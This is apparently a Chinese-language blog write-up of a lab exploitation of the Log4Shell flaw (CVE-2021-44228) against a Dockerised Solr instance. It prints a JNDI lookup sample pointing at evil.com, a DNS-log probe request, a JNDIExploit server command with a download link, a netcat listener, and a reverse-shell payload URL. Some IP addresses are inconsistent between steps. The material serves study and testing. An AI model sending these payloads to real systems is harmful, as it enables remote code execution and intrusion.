    <title>CVE-2021-44228（Apache Log4j2 查找功能 JNDI 注入）   &lt;!–文章标题–&gt;</title>
    <url>/2022/08/11/CVE-2021-44228%EF%BC%88Apache%20Log4j2%20%E6%9F%A5%E6%89%BE%E5%8A%9F%E8%83%BD%20JNDI%20%E6%B3%A8%E5%85%A5%EF%BC%89/</url>
    <content><![CDATA[<h4 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h4><p>攻击机：192.168.129.130_window10</p>
<p>靶机 ：192.168.129.128_kali</p>
<p>JNDIExploit.v1.2：链接: <a href="https://pan.baidu.com/s/1lUcyeU-QlSfCEZI-YU4A-w">https://pan.baidu.com/s/1lUcyeU-QlSfCEZI-YU4A-w</a> 提取码: xiao </p>
<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>Apache Log4j 2 是Java语言的日志处理套件，使用极为广泛。在其2.0到2.14.1版本中存在一处JNDI注入漏洞，攻击者在可以控制日志内容的情况下，通过传入类似于<code>$&#123;jndi:ldap://evil.com/example&#125;</code>的lookup用于进行JNDI注入，执行任意代码。</p>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol>
<li><h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><p>在靶机中使用docker搭建</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/11/CVE-2021-44228%EF%BC%88Apache%20Log4j2%20%E6%9F%A5%E6%89%BE%E5%8A%9F%E8%83%BD%20JNDI%20%E6%B3%A8%E5%85%A5%EF%BC%89/image-20220810113257176-1660185235187.png" alt="image-20220810113257176-1660185235187"></p>
</li>
<li><h5 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h5></li>
</ol>
<p>在<a href="http://dnslog.cn/%E8%8E%B7%E5%8F%96%E4%B8%80%E4%B8%AA%E6%B5%8B%E8%AF%95%E7%9A%84%E5%9F%9F%E5%90%8D">http://dnslog.cn/获取一个测试的域名</a></p>
<p>构造数据包dnslog测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.129.130:8983/solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;.931p5u.dnslog.cn&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/11/CVE-2021-44228%EF%BC%88Apache%20Log4j2%20%E6%9F%A5%E6%89%BE%E5%8A%9F%E8%83%BD%20JNDI%20%E6%B3%A8%E5%85%A5%EF%BC%89/image-20220810115554880.png" alt="image-20220810115554880"></p>
<p>存在漏洞</p>
<ol start="3">
<li><h5 id="中转机vps环境构建"><a href="#中转机vps环境构建" class="headerlink" title="中转机vps环境构建"></a>中转机vps环境构建</h5></li>
</ol>
<p>使用工具exp:Log4j-exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.129.128</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/11/CVE-2021-44228%EF%BC%88Apache%20Log4j2%20%E6%9F%A5%E6%89%BE%E5%8A%9F%E8%83%BD%20JNDI%20%E6%B3%A8%E5%85%A5%EF%BC%89/image-20220810112602168.png" alt="image-20220810112602168"></p>
<ol start="4">
<li><h5 id="启动监听"><a href="#启动监听" class="headerlink" title="启动监听"></a>启动监听</h5></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lnvp 1234</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/11/CVE-2021-44228%EF%BC%88Apache%20Log4j2%20%E6%9F%A5%E6%89%BE%E5%8A%9F%E8%83%BD%20JNDI%20%E6%B3%A8%E5%85%A5%EF%BC%89/image-20220810112520706-1660198332069.png" alt="image-20220810112520706"></p>
<ol start="5">
<li><h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.129.130:8983/solr/admin/cores?action=$&#123;jndi:ldap://192.168.129.130:1389/Basic/ReverseShell/192.168.128.130/1234&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/11/CVE-2021-44228%EF%BC%88Apache%20Log4j2%20%E6%9F%A5%E6%89%BE%E5%8A%9F%E8%83%BD%20JNDI%20%E6%B3%A8%E5%85%A5%EF%BC%89/image-20220810112302254-1660183567356.png" alt="image-20220810112302254-1660183567356"></p>
<h5 id="6-关闭环境"><a href="#6-关闭环境" class="headerlink" title="6.关闭环境"></a>6.关闭环境</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose down --rmi all -v</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/11/CVE-2021-44228%EF%BC%88Apache%20Log4j2%20%E6%9F%A5%E6%89%BE%E5%8A%9F%E8%83%BD%20JNDI%20%E6%B3%A8%E5%85%A5%EF%BC%89/image-20220810115216079.png" alt="image-20220810115216079"></p>
]]></content>
